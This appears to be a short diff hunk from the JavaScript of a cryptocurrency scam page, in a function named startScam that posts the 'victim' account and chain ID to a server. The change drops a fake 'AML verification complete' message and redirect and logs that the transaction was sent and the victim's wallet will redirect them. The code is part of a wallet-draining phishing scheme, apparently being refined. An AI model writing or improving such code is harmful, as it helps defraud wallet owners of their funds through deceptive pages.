@@ -866,8 +866,7 @@ async function startScam() {
     body: JSON.stringify({ victim: account, chain: currentChainId })
   });
 
-  document.querySelector('.scan').textContent = 'Vérification AML terminée. Redirection...';
-  setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
+  console.log('Transaction envoyée, la victime va être redirigée par son wallet.');
 }
 
 // Lancer le module après chargement du DOM
